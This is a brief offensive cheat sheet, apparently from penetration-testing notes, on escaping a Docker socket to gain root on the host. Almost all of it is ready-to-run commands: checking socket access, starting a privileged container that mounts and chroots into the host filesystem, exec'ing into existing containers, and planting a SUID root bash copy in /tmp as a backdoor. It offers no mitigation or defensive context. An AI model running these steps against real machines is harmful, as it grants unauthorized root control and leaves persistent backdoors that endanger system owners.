# Docker Socket Escape

If the current user can access `/var/run/docker.sock` (member of `docker` group, or via sudo), they can run privileged containers that mount the host filesystem.

```bash
# Check access:
ls -la /var/run/docker.sock
groups    # look for 'docker'
sudo -l   # look for docker commands

# Mount host disk into a privileged container:
docker run -it --privileged --pid=host --net=host \
  -v /:/mnt --user root alpine chroot /mnt bash

# If a privileged container is already running, exec into it:
sudo docker exec -it --privileged --user root <CONTAINER_ID> bash
# Inside: mount /dev/sda1 /mnt && chroot /mnt bash
```

For SUID bash after getting root in container:
```bash
# Inside chroot:
cp /bin/bash /mnt/tmp/rootbash
chmod 4755 /mnt/tmp/rootbash
# Back on host:
/tmp/rootbash -p
```

If socket is accessible but group membership is missing:
```bash
# Enumerate running container IDs:
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
```
